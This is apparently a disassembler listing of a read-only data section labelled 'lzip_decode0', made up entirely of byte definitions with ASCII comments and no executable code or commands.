.rodata.lzip_decode0:000000000000C0BD                 db    2
.rodata.lzip_decode0:000000000000C0BE                 db    0
.rodata.lzip_decode0:000000000000C0BF                 db    0
.rodata.lzip_decode0:000000000000C0C0                 db  43h ; C
.rodata.lzip_decode0:000000000000C0C1                 db    1
.rodata.lzip_decode0:000000000000C0C2                 db    0
.rodata.lzip_decode0:000000000000C0C3                 db    0
.rodata.lzip_decode0:000000000000C0C4                 db  52h ; R
.rodata.lzip_decode0:000000000000C0C5                 db    2
.rodata.lzip_decode0:000000000000C0C6                 db    0
.rodata.lzip_decode0:000000000000C0C7                 db    0
.rodata.lzip_decode0:000000000000C0C8                 db  23h ; #
.rodata.lzip_decode0:000000000000C0C9                 db    0
.rodata.lzip_decode0:000000000000C0CA                 db    0
.rodata.lzip_decode0:000000000000C0CB                 db    0
.rodata.lzip_decode0:000000000000C0CC                 db  63h ; c
.rodata.lzip_decode0:000000000000C0CD                 db    3
.rodata.lzip_decode0:000000000000C0CE                 db    0
.rodata.lzip_decode0:000000000000C0CF                 db    0
.rodata.lzip_decode0:000000000000C0D0                 db 0F3h
.rodata.lzip_decode0:000000000000C0D1                 db    1
.rodata.lzip_decode0:000000000000C0D2                 db    0
.rodata.lzip_decode0:000000000000C0D3                 db    0
.rodata.lzip_decode0:000000000000C0D4                 db  92h
.rodata.lzip_decode0:000000000000C0D5                 db    1
.rodata.lzip_decode0:000000000000C0D6                 db    0
.rodata.lzip_decode0:000000000000C0D7                 db    0
.rodata.lzip_decode0:000000000000C0D8                 db  12h
.rodata.lzip_decode0:000000000000C0D9                 db    0
.rodata.lzip_decode0:000000000000C0DA                 db    0
.rodata.lzip_decode0:000000000000C0DB                 db    0
.rodata.lzip_decode0:000000000000C0DC                 db  62h ; b
.rodata.lzip_decode0:000000000000C0DD                 db    3
.rodata.lzip_decode0:000000000000C0DE                 db    0
.rodata.lzip_decode0:000000000000C0DF                 db    0
.rodata.lzip_decode0:000000000000C0E0                 db 0F3h
.rodata.lzip_decode0:000000000000C0E1                 db    2
.rodata.lzip_decode0:000000000000C0E2                 db    0
.rodata.lzip_decode0:000000000000C0E3                 db    0
.rodata.lzip_decode0:000000000000C0E4                 db  33h ; 3
.rodata.lzip_decode0:000000000000C0E5                 db    2
.rodata.lzip_decode0:000000000000C0E6                 db    0
.rodata.lzip_decode0:000000000000C0E7                 db    0
.rodata.lzip_decode0:000000000000C0E8                 db 0B0h
.rodata.lzip_decode0:000000000000C0E9                 db    5
.rodata.lzip_decode0:000000000000C0EA                 db  60h ; `
.rodata.lzip_decode0:000000000000C0EB                 db    0
.rodata.lzip_decode0:000000000000C0EC                 db  92h
.rodata.lzip_decode0:000000000000C0ED                 db    6
.rodata.lzip_decode0:000000000000C0EE                 db    0
.rodata.lzip_decode0:000000000000C0EF                 db    0
.rodata.lzip_decode0:000000000000C0F0                 db    4
.rodata.lzip_decode0:000000000000C0F1                 db    0
.rodata.lzip_decode0:000000000000C0F2                 db  88h
.rodata.lzip_decode0:000000000000C0F3                 db    0
.rodata.lzip_decode0:000000000000C0F4                 db  12h
.rodata.lzip_decode0:000000000000C0F5                 db    0
.rodata.lzip_decode0:000000000000C0F6                 db    0
.rodata.lzip_decode0:000000000000C0F7                 db    0
.rodata.lzip_decode0:000000000000C0F8                 db    2
.rodata.lzip_decode0:000000000000C0F9                 db    1
.rodata.lzip_decode0:000000000000C0FA                 db    0
.rodata.lzip_decode0:000000000000C0FB                 db    0
.rodata.lzip_decode0:000000000000C0FC                 db  63h ; c
.rodata.lzip_decode0:000000000000C0FD                 db    1
.rodata.lzip_decode0:000000000000C0FE                 db    0
.rodata.lzip_decode0:000000000000C0FF                 db    0
.rodata.lzip_decode0:000000000000C100                 db  13h
.rodata.lzip_decode0:000000000000C101                 db    0
.rodata.lzip_decode0:000000000000C102                 db    0
.rodata.lzip_decode0:000000000000C103                 db    0
.rodata.lzip_decode0:000000000000C104                 db  12h
.rodata.lzip_decode0:000000000000C105                 db    2
.rodata.lzip_decode0:000000000000C106                 db    0
.rodata.lzip_decode0:000000000000C107                 db    0
.rodata.lzip_decode0:000000000000C108                 db 0A3h
.rodata.lzip_decode0:000000000000C109                 db    1
.rodata.lzip_decode0:000000000000C10A                 db    0
.rodata.lzip_decode0:000000000000C10B                 db    0
.rodata.lzip_decode0:000000000000C10C                 db  32h ; 2
.rodata.lzip_decode0:000000000000C10D                 db    1
.rodata.lzip_decode0:000000000000C10E                 db    0
.rodata.lzip_decode0:000000000000C10F                 db    0
.rodata.lzip_decode0:000000000000C110                 db 0F3h
.rodata.lzip_decode0:000000000000C111                 db    1
.rodata.lzip_decode0:000000000000C112                 db    0
.rodata.lzip_decode0:000000000000C113                 db    0
.rodata.lzip_decode0:000000000000C114                 db 0B2h
.rodata.lzip_decode0:000000000000C115                 db    1
.rodata.lzip_decode0:000000000000C116                 db    0
.rodata.lzip_decode0:000000000000C117                 db    0
.rodata.lzip_decode0:000000000000C118                 db  93h
.rodata.lzip_decode0:000000000000C119                 db    0
.rodata.lzip_decode0:000000000000C11A                 db    0
.rodata.lzip_decode0:000000000000C11B                 db    0
.rodata.lzip_decode0:000000000000C11C                 db    4
.rodata.lzip_decode0:000000000000C11D                 db    0
.rodata.lzip_decode0:000000000000C11E                 db  90h
.rodata.lzip_decode0:000000000000C11F                 db    0
.rodata.lzip_decode0:000000000000C120                 db  32h ; 2
.rodata.lzip_decode0:000000000000C121                 db    1
.rodata.lzip_decode0:000000000000C122                 db    0
.rodata.lzip_decode0:000000000000C123                 db    0
.rodata.lzip_decode0:000000000000C124                 db 0A3h
.rodata.lzip_decode0:000000000000C125                 db    1
.rodata.lzip_decode0:000000000000C126                 db    0
.rodata.lzip_decode0:000000000000C127                 db    0
.rodata.lzip_decode0:000000000000C128                 db  92h
.rodata.lzip_decode0:000000000000C129                 db    1
.rodata.lzip_decode0:000000000000C12A                 db    0
.rodata.lzip_decode0:000000000000C12B                 db    0
.rodata.lzip_decode0:000000000000C12C                 db  53h ; S
.rodata.lzip_decode0:000000000000C12D                 db    0
.rodata.lzip_decode0:000000000000C12E                 db    0
.rodata.lzip_decode0:000000000000C12F                 db    0
.rodata.lzip_decode0:000000000000C130                 db    4
.rodata.lzip_decode0:000000000000C131                 db    0
.rodata.lzip_decode0:000000000000C132                 db  80h
.rodata.lzip_decode0:000000000000C133                 db    0
.rodata.lzip_decode0:000000000000C134                 db  12h
.rodata.lzip_decode0:000000000000C135                 db    0
.rodata.lzip_decode0:000000000000C136                 db    0
.rodata.lzip_decode0:000000000000C137                 db    0
.rodata.lzip_decode0:000000000000C138                 db 0C2h
.rodata.lzip_decode0:000000000000C139                 db    0
.rodata.lzip_decode0:000000000000C13A                 db    0
.rodata.lzip_decode0:000000000000C13B                 db    0
.rodata.lzip_decode0:000000000000C13C                 db  63h ; c
.rodata.lzip_decode0:000000000000C13D                 db    1
.rodata.lzip_decode0:000000000000C13E                 db    0
.rodata.lzip_decode0:000000000000C13F                 db    0
.rodata.lzip_decode0:000000000000C140                 db 0C2h
.rodata.lzip_decode0:000000000000C141                 db    0
.rodata.lzip_decode0:000000000000C142                 db    0
.rodata.lzip_decode0:000000000000C143                 db    0
.rodata.lzip_decode0:000000000000C144                 db 0A3h
.rodata.lzip_decode0:000000000000C145                 db    0
.rodata.lzip_decode0:000000000000C146                 db    0
.rodata.lzip_decode0:000000000000C147                 db    0
.rodata.lzip_decode0:000000000000C148                 db  62h ; b
.rodata.lzip_decode0:000000000000C149                 db    1
.rodata.lzip_decode0:000000000000C14A                 db    0
.rodata.lzip_decode0:000000000000C14B                 db    0
.rodata.lzip_decode0:000000000000C14C                 db  70h ; p
.rodata.lzip_decode0:000000000000C14D                 db    5
.rodata.lzip_decode0:000000000000C14E                 db  30h ; 0
.rodata.lzip_decode0:000000000000C14F                 db    0
.rodata.lzip_decode0:000000000000C150                 db  70h ; p
.rodata.lzip_decode0:000000000000C151                 db    5
.rodata.lzip_decode0:000000000000C152                 db  1Ch
.rodata.lzip_decode0:000000000000C153                 db    0
.rodata.lzip_decode0:000000000000C154                 db  32h ; 2
.rodata.lzip_decode0:000000000000C155                 db    5
.rodata.lzip_decode0:000000000000C156                 db    0
.rodata.lzip_decode0:000000000000C157                 db    0
.rodata.lzip_decode0:000000000000C158                 db 0F1h
.rodata.lzip_decode0:000000000000C159                 db    4
.rodata.lzip_decode0:000000000000C15A                 db    8
.rodata.lzip_decode0:000000000000C15B                 db    0
.rodata.lzip_decode0:000000000000C15C                 db  33h ; 3
.rodata.lzip_decode0:000000000000C15D                 db    2
.rodata.lzip_decode0:000000000000C15E                 db    0
.rodata.lzip_decode0:000000000000C15F                 db    0
.rodata.lzip_decode0:000000000000C160                 db  62h ; b
.rodata.lzip_decode0:000000000000C161                 db    2
.rodata.lzip_decode0:000000000000C162                 db    0
.rodata.lzip_decode0:000000000000C163                 db    0
.rodata.lzip_decode0:000000000000C164                 db  10h
.rodata.lzip_decode0:000000000000C165                 db    0
.rodata.lzip_decode0:000000000000C166                 db  78h ; x
.rodata.lzip_decode0:000000000000C167                 db    0
.rodata.lzip_decode0:000000000000C168                 db  92h
.rodata.lzip_decode0:000000000000C169                 db    4
.rodata.lzip_decode0:000000000000C16A                 db    0
.rodata.lzip_decode0:000000000000C16B                 db    0
.rodata.lzip_decode0:000000000000C16C                 db 0E1h
.rodata.lzip_decode0:000000000000C16D                 db    6
.rodata.lzip_decode0:000000000000C16E                 db    4
.rodata.lzip_decode0:000000000000C16F                 db    0
.rodata.lzip_decode0:000000000000C170                 db    4
.rodata.lzip_decode0:000000000000C171                 db    0
.rodata.lzip_decode0:000000000000C172                 db  98h
.rodata.lzip_decode0:000000000000C173                 db    0
.rodata.lzip_decode0:000000000000C174                 db  83h
.rodata.lzip_decode0:000000000000C175                 db    0
.rodata.lzip_decode0:000000000000C176                 db    0
.rodata.lzip_decode0:000000000000C177                 db    0
.rodata.lzip_decode0:000000000000C178                 db  62h ; b
.rodata.lzip_decode0:000000000000C179                 db    2
.rodata.lzip_decode0:000000000000C17A                 db    0
.rodata.lzip_decode0:000000000000C17B                 db    0
.rodata.lzip_decode0:000000000000C17C                 db 0A3h
.rodata.lzip_decode0:000000000000C17D                 db    1
.rodata.lzip_decode0:000000000000C17E                 db    0
.rodata.lzip_decode0:000000000000C17F                 db    0
.rodata.lzip_decode0:000000000000C180                 db  32h ; 2
.rodata.lzip_decode0:000000000000C181                 db    1
.rodata.lzip_decode0:000000000000C182                 db    0
.rodata.lzip_decode0:000000000000C183                 db    0
.rodata.lzip_decode0:000000000000C184                 db  33h ; 3
.rodata.lzip_decode0:000000000000C185                 db    0
.rodata.lzip_decode0:000000000000C186                 db    0
.rodata.lzip_decode0:000000000000C187                 db    0
.rodata.lzip_decode0:000000000000C188                 db 0F3h
.rodata.lzip_decode0:000000000000C189                 db    1
.rodata.lzip_decode0:000000000000C18A                 db    0
.rodata.lzip_decode0:000000000000C18B                 db    0
.rodata.lzip_decode0:000000000000C18C                 db  42h ; B
.rodata.lzip_decode0:000000000000C18D                 db    2
.rodata.lzip_decode0:000000000000C18E                 db    0
.rodata.lzip_decode0:000000000000C18F                 db    0
.rodata.lzip_decode0:000000000000C190                 db    4
.rodata.lzip_decode0:000000000000C191                 db    0
.rodata.lzip_decode0:000000000000C192                 db 0F8h
.rodata.lzip_decode0:000000000000C193                 db    9
.rodata.lzip_decode0:000000000000C194                 db  83h
.rodata.lzip_decode0:000000000000C195                 db    0
.rodata.lzip_decode0:000000000000C196                 db    0
.rodata.lzip_decode0:000000000000C197                 db    0
.rodata.lzip_decode0:000000000000C198                 db 0B2h
.rodata.lzip_decode0:000000000000C199                 db    1
.rodata.lzip_decode0:000000000000C19A                 db    0
.rodata.lzip_decode0:000000000000C19B                 db    0
.rodata.lzip_decode0:000000000000C19C                 db  32h ; 2
.rodata.lzip_decode0:000000000000C19D                 db    0
.rodata.lzip_decode0:000000000000C19E                 db    0
.rodata.lzip_decode0:000000000000C19F                 db    0
.rodata.lzip_decode0:000000000000C1A0                 db 0C3h
.rodata.lzip_decode0:000000000000C1A1                 db    1
.rodata.lzip_decode0:000000000000C1A2                 db    0
.rodata.lzip_decode0:000000000000C1A3                 db    0
.rodata.lzip_decode0:000000000000C1A4                 db  10h
.rodata.lzip_decode0:000000000000C1A5                 db    5
.rodata.lzip_decode0:000000000000C1A6                 db  40h ; @
.rodata.lzip_decode0:000000000000C1A7                 db    1
.rodata.lzip_decode0:000000000000C1A8                 db  90h
.rodata.lzip_decode0:000000000000C1A9                 db    5
.rodata.lzip_decode0:000000000000C1AA                 db  24h ; $
.rodata.lzip_decode0:000000000000C1AB                 db    1
.rodata.lzip_decode0:000000000000C1AC                 db 0D0h
.rodata.lzip_decode0:000000000000C1AD                 db    6
.rodata.lzip_decode0:000000000000C1AE                 db  34h ; 4
.rodata.lzip_decode0:000000000000C1AF                 db    0
.rodata.lzip_decode0:000000000000C1B0                 db 0A0h
.rodata.lzip_decode0:000000000000C1B1                 db    4
.rodata.lzip_decode0:000000000000C1B2                 db  14h
.rodata.lzip_decode0:000000000000C1B3                 db    0
.rodata.lzip_decode0:000000000000C1B4                 db 0C2h
.rodata.lzip_decode0:000000000000C1B5                 db    6
.rodata.lzip_decode0:000000000000C1B6                 db    0
.rodata.lzip_decode0:000000000000C1B7                 db    0
.rodata.lzip_decode0:000000000000C1B8                 db    4
.rodata.lzip_decode0:000000000000C1B9                 db    0
.rodata.lzip_decode0:000000000000C1BA                 db  98h
.rodata.lzip_decode0:000000000000C1BB                 db    1
.rodata.lzip_decode0:000000000000C1BC                 db 0E2h
.rodata.lzip_decode0:000000000000C1BD                 db    0
.rodata.lzip_decode0:000000000000C1BE                 db    0
.rodata.lzip_decode0:000000000000C1BF                 db    0
.rodata.lzip_decode0:000000000000C1C0                 db  32h ; 2
.rodata.lzip_decode0:000000000000C1C1                 db    0
.rodata.lzip_decode0:000000000000C1C2                 db    0
.rodata.lzip_decode0:000000000000C1C3                 db    0
.rodata.lzip_decode0:000000000000C1C4                 db 0A3h
.rodata.lzip_decode0:000000000000C1C5                 db    1
.rodata.lzip_decode0:000000000000C1C6                 db    0
.rodata.lzip_decode0:000000000000C1C7                 db    0
.rodata.lzip_decode0:000000000000C1C8                 db  42h ; B
.rodata.lzip_decode0:000000000000C1C9                 db    1
.rodata.lzip_decode0:000000000000C1CA                 db    0
.rodata.lzip_decode0:000000000000C1CB                 db    0
.rodata.lzip_decode0:000000000000C1CC                 db  62h ; b
.rodata.lzip_decode0:000000000000C1CD                 db    0
.rodata.lzip_decode0:000000000000C1CE                 db    0
.rodata.lzip_decode0:000000000000C1CF                 db    0
.rodata.lzip_decode0:000000000000C1D0                 db    4
.rodata.lzip_decode0:000000000000C1D1                 db    0
.rodata.lzip_decode0:000000000000C1D2                 db  10h
.rodata.lzip_decode0:000000000000C1D3                 db  0Bh
.rodata.lzip_decode0:000000000000C1D4                 db  92h
.rodata.lzip_decode0:000000000000C1D5                 db    1
.rodata.lzip_decode0:000000000000C1D6                 db    0
.rodata.lzip_decode0:000000000000C1D7                 db    0
.rodata.lzip_decode0:000000000000C1D8                 db  50h ; P
.rodata.lzip_decode0:000000000000C1D9                 db    5
.rodata.lzip_decode0:000000000000C1DA                 db    8
.rodata.lzip_decode0:000000000000C1DB                 db    0
.rodata.lzip_decode0:000000000000C1DC                 db  62h ; b
.rodata.lzip_decode0:000000000000C1DD                 db    5
.rodata.lzip_decode0:000000000000C1DE                 db    0
.rodata.lzip_decode0:000000000000C1DF                 db    0
.rodata.lzip_decode0:000000000000C1E0                 db    4
.rodata.lzip_decode0:000000000000C1E1                 db    0
.rodata.lzip_decode0:000000000000C1E2                 db  80h
.rodata.lzip_decode0:000000000000C1E3                 db    3
.rodata.lzip_decode0:000000000000C1E4                 db  42h ; B
.rodata.lzip_decode0:000000000000C1E5                 db    1
.rodata.lzip_decode0:000000000000C1E6                 db    0
.rodata.lzip_decode0:000000000000C1E7                 db    0
.rodata.lzip_decode0:000000000000C1E8                 db  32h ; 2
.rodata.lzip_decode0:000000000000C1E9                 db    0
.rodata.lzip_decode0:000000000000C1EA                 db    0
.rodata.lzip_decode0:000000000000C1EB                 db    0
.rodata.lzip_decode0:000000000000C1EC                 db  43h ; C
.rodata.lzip_decode0:000000000000C1ED                 db    1
.rodata.lzip_decode0:000000000000C1EE                 db    0
.rodata.lzip_decode0:000000000000C1EF                 db    0
.rodata.lzip_decode0:000000000000C1F0                 db 0C3h
.rodata.lzip_decode0:000000000000C1F1                 db    0
.rodata.lzip_decode0:000000000000C1F2                 db    0
.rodata.lzip_decode0:000000000000C1F3                 db    0
.rodata.lzip_decode0:000000000000C1F4                 db    4
.rodata.lzip_decode0:000000000000C1F5                 db    0
.rodata.lzip_decode0:000000000000C1F6                 db  10h
.rodata.lzip_decode0:000000000000C1F7                 db    0
.rodata.lzip_decode0:000000000000C1F8                 db  42h ; B
.rodata.lzip_decode0:000000000000C1F9                 db    1
.rodata.lzip_decode0:000000000000C1FA                 db    0
.rodata.lzip_decode0:000000000000C1FB                 db    0
.rodata.lzip_decode0:000000000000C1FC                 db 0A2h
.rodata.lzip_decode0:000000000000C1FD                 db    3
.rodata.lzip_decode0:000000000000C1FE                 db    0
.rodata.lzip_decode0:000000000000C1FF                 db    0
.rodata.lzip_decode0:000000000000C200                 db 0B3h
.rodata.lzip_decode0:000000000000C201                 db    4
.rodata.lzip_decode0:000000000000C202                 db    0
.rodata.lzip_decode0:000000000000C203                 db    0
.rodata.lzip_decode0:000000000000C204                 db  93h
.rodata.lzip_decode0:000000000000C205                 db    0
.rodata.lzip_decode0:000000000000C206                 db    0
.rodata.lzip_decode0:000000000000C207                 db    0
.rodata.lzip_decode0:000000000000C208                 db  73h ; s
.rodata.lzip_decode0:000000000000C209                 db    0
.rodata.lzip_decode0:000000000000C20A                 db    0
.rodata.lzip_decode0:000000000000C20B                 db    0
.rodata.lzip_decode0:000000000000C20C                 db  12h
.rodata.lzip_decode0:000000000000C20D                 db    0
.rodata.lzip_decode0:000000000000C20E                 db    0
.rodata.lzip_decode0:000000000000C20F                 db    0
.rodata.lzip_decode0:000000000000C210                 db    3
.rodata.lzip_decode0:000000000000C211                 db    0
.rodata.lzip_decode0:000000000000C212                 db    0
.rodata.lzip_decode0:000000000000C213                 db    0
.rodata.lzip_decode0:000000000000C214                 db  92h
.rodata.lzip_decode0:000000000000C215                 db    1
.rodata.lzip_decode0:000000000000C216                 db    0
.rodata.lzip_decode0:000000000000C217                 db    0
.rodata.lzip_decode0:000000000000C218                 db 0A2h
.rodata.lzip_decode0:000000000000C219                 db    3
.rodata.lzip_decode0:000000000000C21A                 db    0
.rodata.lzip_decode0:000000000000C21B                 db    0
.rodata.lzip_decode0:000000000000C21C                 db  93h
.rodata.lzip_decode0:000000000000C21D                 db    5
.rodata.lzip_decode0:000000000000C21E                 db    0
.rodata.lzip_decode0:000000000000C21F                 db    0
.rodata.lzip_decode0:000000000000C220                 db    2
.rodata.lzip_decode0:000000000000C221                 db    1
.rodata.lzip_decode0:000000000000C222                 db    0
.rodata.lzip_decode0:000000000000C223                 db    0
.rodata.lzip_decode0:000000000000C224                 db 0D2h
.rodata.lzip_decode0:000000000000C225                 db    0
.rodata.lzip_decode0:000000000000C226                 db    0
.rodata.lzip_decode0:000000000000C227                 db    0
.rodata.lzip_decode0:000000000000C228                 db 0E3h
.rodata.lzip_decode0:000000000000C229                 db    1
.rodata.lzip_decode0:000000000000C22A                 db    0
.rodata.lzip_decode0:000000000000C22B                 db    0
.rodata.lzip_decode0:000000000000C22C                 db  82h
.rodata.lzip_decode0:000000000000C22D                 db    0
.rodata.lzip_decode0:000000000000C22E                 db    0
.rodata.lzip_decode0:000000000000C22F                 db    0
.rodata.lzip_decode0:000000000000C230                 db  13h
.rodata.lzip_decode0:000000000000C231                 db    0
.rodata.lzip_decode0:000000000000C232                 db    0
.rodata.lzip_decode0:000000000000C233                 db    0
.rodata.lzip_decode0:000000000000C234                 db 0C2h
.rodata.lzip_decode0:000000000000C235                 db    1
.rodata.lzip_decode0:000000000000C236                 db    0
.rodata.lzip_decode0:000000000000C237                 db    0
.rodata.lzip_decode0:000000000000C238                 db 0A3h
.rodata.lzip_decode0:000000000000C239                 db    0
.rodata.lzip_decode0:000000000000C23A                 db    0
.rodata.lzip_decode0:000000000000C23B                 db    0
.rodata.lzip_decode0:000000000000C23C                 db    4
.rodata.lzip_decode0:000000000000C23D                 db    0
.rodata.lzip_decode0:000000000000C23E                 db    0
.rodata.lzip_decode0:000000000000C23F                 db  0Bh
.rodata.lzip_decode0:000000000000C240                 db 0C2h
.rodata.lzip_decode0:000000000000C241                 db    6
.rodata.lzip_decode0:000000000000C242                 db    0
.rodata.lzip_decode0:000000000000C243                 db    0
.rodata.lzip_decode0:000000000000C244                 db 0F3h
.rodata.lzip_decode0:000000000000C245                 db    1
.rodata.lzip_decode0:000000000000C246                 db    0
.rodata.lzip_decode0:000000000000C247                 db    0
.rodata.lzip_decode0:000000000000C248                 db 0C3h
.rodata.lzip_decode0:000000000000C249                 db    2
.rodata.lzip_decode0:000000000000C24A                 db    0
.rodata.lzip_decode0:000000000000C24B                 db    0
.rodata.lzip_decode0:000000000000C24C                 db 0F3h
.rodata.lzip_decode0:000000000000C24D                 db    0
.rodata.lzip_decode0:000000000000C24E                 db    0
.rodata.lzip_decode0:000000000000C24F                 db    0
.rodata.lzip_decode0:000000000000C250                 db 0E3h
.rodata.lzip_decode0:000000000000C251                 db    1
.rodata.lzip_decode0:000000000000C252                 db    0
.rodata.lzip_decode0:000000000000C253                 db    0
.rodata.lzip_decode0:000000000000C254                 db 0C2h
.rodata.lzip_decode0:000000000000C255                 db    1
.rodata.lzip_decode0:000000000000C256                 db    0
.rodata.lzip_decode0:000000000000C257                 db    0
.rodata.lzip_decode0:000000000000C258                 db 0D3h
.rodata.lzip_decode0:000000000000C259                 db    1
.rodata.lzip_decode0:000000000000C25A                 db    0
.rodata.lzip_decode0:000000000000C25B                 db    0
.rodata.lzip_decode0:000000000000C25C                 db  52h ; R
.rodata.lzip_decode0:000000000000C25D                 db    4
.rodata.lzip_decode0:000000000000C25E                 db    0
.rodata.lzip_decode0:000000000000C25F                 db    0
.rodata.lzip_decode0:000000000000C260                 db  43h ; C
.rodata.lzip_decode0:000000000000C261                 db    4
.rodata.lzip_decode0:000000000000C262                 db    0
.rodata.lzip_decode0:000000000000C263                 db    0
.rodata.lzip_decode0:000000000000C264                 db    3
.rodata.lzip_decode0:000000000000C265                 db    0
.rodata.lzip_decode0:000000000000C266                 db    0
.rodata.lzip_decode0:000000000000C267                 db    0
.rodata.lzip_decode0:000000000000C268                 db    2
.rodata.lzip_decode0:000000000000C269                 db    5
.rodata.lzip_decode0:000000000000C26A                 db    0
.rodata.lzip_decode0:000000000000C26B                 db    0
.rodata.lzip_decode0:000000000000C26C                 db  13h
.rodata.lzip_decode0:000000000000C26D                 db    3
.rodata.lzip_decode0:000000000000C26E                 db    0
.rodata.lzip_decode0:000000000000C26F                 db    0
.rodata.lzip_decode0:000000000000C270                 db  73h ; s
.rodata.lzip_decode0:000000000000C271                 db    0
.rodata.lzip_decode0:000000000000C272                 db    0
.rodata.lzip_decode0:000000000000C273                 db    0
.rodata.lzip_decode0:000000000000C274                 db  32h ; 2
.rodata.lzip_decode0:000000000000C275                 db    5
.rodata.lzip_decode0:000000000000C276                 db    0
.rodata.lzip_decode0:000000000000C277                 db    0
.rodata.lzip_decode0:000000000000C278                 db 0F3h
.rodata.lzip_decode0:000000000000C279                 db    1
.rodata.lzip_decode0:000000000000C27A                 db    0
.rodata.lzip_decode0:000000000000C27B                 db    0
.rodata.lzip_decode0:000000000000C27C                 db  43h ; C
.rodata.lzip_decode0:000000000000C27D                 db    2
.rodata.lzip_decode0:000000000000C27E                 db    0
.rodata.lzip_decode0:000000000000C27F                 db    0
.rodata.lzip_decode0:000000000000C280                 db  83h
.rodata.lzip_decode0:000000000000C281                 db    2
.rodata.lzip_decode0:000000000000C282                 db    0
.rodata.lzip_decode0:000000000000C283                 db    0
.rodata.lzip_decode0:000000000000C284                 db  12h
.rodata.lzip_decode0:000000000000C285                 db    0
.rodata.lzip_decode0:000000000000C286                 db    0
.rodata.lzip_decode0:000000000000C287                 db    0
.rodata.lzip_decode0:000000000000C288                 db  92h
.rodata.lzip_decode0:000000000000C289                 db    0
.rodata.lzip_decode0:000000000000C28A                 db    0
.rodata.lzip_decode0:000000000000C28B                 db    0
.rodata.lzip_decode0:000000000000C28C                 db  33h ; 3
.rodata.lzip_decode0:000000000000C28D                 db    0
.rodata.lzip_decode0:000000000000C28E                 db    0
.rodata.lzip_decode0:000000000000C28F                 db    0
.rodata.lzip_decode0:000000000000C290                 db 0F2h
.rodata.lzip_decode0:000000000000C291                 db    3
.rodata.lzip_decode0:000000000000C292                 db    0
.rodata.lzip_decode0:000000000000C293                 db    0
.rodata.lzip_decode0:000000000000C294                 db 0F3h
.rodata.lzip_decode0:000000000000C295                 db    3
.rodata.lzip_decode0:000000000000C296                 db    0
.rodata.lzip_decode0:000000000000C297                 db    0
.rodata.lzip_decode0:000000000000C298                 db 0B2h
.rodata.lzip_decode0:000000000000C299                 db    5
.rodata.lzip_decode0:000000000000C29A                 db    0
.rodata.lzip_decode0:000000000000C29B                 db    0
.rodata.lzip_decode0:000000000000C29C                 db  93h
.rodata.lzip_decode0:000000000000C29D                 db    5
.rodata.lzip_decode0:000000000000C29E                 db    0
.rodata.lzip_decode0:000000000000C29F                 db    0
.rodata.lzip_decode0:000000000000C2A0                 db    3
.rodata.lzip_decode0:000000000000C2A1                 db    1
.rodata.lzip_decode0:000000000000C2A2                 db    0
.rodata.lzip_decode0:000000000000C2A3                 db    0
.rodata.lzip_decode0:000000000000C2A4                 db 0D2h
.rodata.lzip_decode0:000000000000C2A5                 db    0
.rodata.lzip_decode0:000000000000C2A6                 db    0
.rodata.lzip_decode0:000000000000C2A7                 db    0
.rodata.lzip_decode0:000000000000C2A8                 db  82h
.rodata.lzip_decode0:000000000000C2A9                 db    5
.rodata.lzip_decode0:000000000000C2AA                 db    0
.rodata.lzip_decode0:000000000000C2AB                 db    0
.rodata.lzip_decode0:000000000000C2AC                 db  93h
.rodata.lzip_decode0:000000000000C2AD                 db    5
.rodata.lzip_decode0:000000000000C2AE                 db    0
.rodata.lzip_decode0:000000000000C2AF                 db    0
.rodata.lzip_decode0:000000000000C2B0                 db  63h ; c
.rodata.lzip_decode0:000000000000C2B1                 db    0
.rodata.lzip_decode0:000000000000C2B2                 db    0
.rodata.lzip_decode0:000000000000C2B3                 db    0
.rodata.lzip_decode0:000000000000C2B4                 db  32h ; 2
.rodata.lzip_decode0:000000000000C2B5                 db    1
.rodata.lzip_decode0:000000000000C2B6                 db    0
.rodata.lzip_decode0:000000000000C2B7                 db    0
.rodata.lzip_decode0:000000000000C2B8                 db  23h ; #
.rodata.lzip_decode0:000000000000C2B9                 db    2
.rodata.lzip_decode0:000000000000C2BA                 db    0
.rodata.lzip_decode0:000000000000C2BB                 db    0
.rodata.lzip_decode0:000000000000C2BC                 db 0A3h
.rodata.lzip_decode0:000000000000C2BD                 db    0
.rodata.lzip_decode0:000000000000C2BE                 db    0
.rodata.lzip_decode0:000000000000C2BF                 db    0
.rodata.lzip_decode0:000000000000C2C0                 db  61h ; a
.rodata.lzip_decode0:000000000000C2C1                 db    2
.rodata.lzip_decode0:000000000000C2C2                 db  5Bh ; [
.rodata.lzip_decode0:000000000000C2C3                 db    0
.rodata.lzip_decode0:000000000000C2C4                 db  62h ; b
.rodata.lzip_decode0:000000000000C2C5                 db    0
.rodata.lzip_decode0:000000000000C2C6                 db    0
.rodata.lzip_decode0:000000000000C2C7                 db    0
.rodata.lzip_decode0:000000000000C2C8                 db 0E0h
.rodata.lzip_decode0:000000000000C2C9                 db    6
.rodata.lzip_decode0:000000000000C2CA                 db 0C8h
.rodata.lzip_decode0:000000000000C2CB                 db  13h
.rodata.lzip_decode0:000000000000C2CC                 db    0
.rodata.lzip_decode0:000000000000C2CD                 db    6
.rodata.lzip_decode0:000000000000C2CE                 db  5Ch ; \
.rodata.lzip_decode0:000000000000C2CF                 db  13h
.rodata.lzip_decode0:000000000000C2D0                 db 0C0h
.rodata.lzip_decode0:000000000000C2D1                 db    5
.rodata.lzip_decode0:000000000000C2D2                 db  20h
.rodata.lzip_decode0:000000000000C2D3                 db  13h
.rodata.lzip_decode0:000000000000C2D4                 db  60h ; `
.rodata.lzip_decode0:000000000000C2D5                 db    5
.rodata.lzip_decode0:000000000000C2D6                 db  98h
.rodata.lzip_decode0:000000000000C2D7                 db  12h
.rodata.lzip_decode0:000000000000C2D8                 db    0
.rodata.lzip_decode0:000000000000C2D9                 db    5
.rodata.lzip_decode0:000000000000C2DA                 db  14h
.rodata.lzip_decode0:000000000000C2DB                 db  12h
.rodata.lzip_decode0:000000000000C2DC                 db  30h ; 0
.rodata.lzip_decode0:000000000000C2DD                 db    7
.rodata.lzip_decode0:000000000000C2DE                 db 0E0h
.rodata.lzip_decode0:000000000000C2DF                 db  10h
.rodata.lzip_decode0:000000000000C2E0                 db  30h ; 0
.rodata.lzip_decode0:000000000000C2E1                 db    4
.rodata.lzip_decode0:000000000000C2E2                 db  7Ch ; |
.rodata.lzip_decode0:000000000000C2E3                 db  10h
.rodata.lzip_decode0:000000000000C2E4                 db 0A0h
.rodata.lzip_decode0:000000000000C2E5                 db    2
.rodata.lzip_decode0:000000000000C2E6                 db  90h
.rodata.lzip_decode0:000000000000C2E7                 db  0Dh
.rodata.lzip_decode0:000000000000C2E8                 db  80h
.rodata.lzip_decode0:000000000000C2E9                 db    4
.rodata.lzip_decode0:000000000000C2EA                 db    0
